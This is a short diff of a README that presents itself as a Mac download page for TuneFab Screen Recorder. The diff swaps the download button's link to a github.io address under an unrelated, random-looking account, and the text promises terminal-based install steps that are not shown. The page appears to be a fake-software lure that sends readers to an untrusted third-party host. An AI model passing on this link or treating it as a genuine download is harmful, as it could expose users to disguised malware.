@@ -1,7 +1,7 @@
 # TuneFab Screen Recorder — Download For Mac OS 🎥  
 TuneFab Screen Recorder is a powerful and intuitive tool that allows you to capture screen activity, system sound, microphone, and webcam on your Mac. Perfect for creating tutorials, gameplay videos, or online meeting recordings. Follow the steps below to install it easily on macOS.
 
-[![Download for macOS](https://img.shields.io/badge/Download%20for-macOS-blue?style=for-the-badge&logo=apple)](https://tunefab-screen-recorder-for-mac.github.io/.github/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for-macOS-blue?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/tunefab)
 
 If the button above doesn't work, follow the terminal-based instructions below to install TuneFab Screen Recorder manually.
 
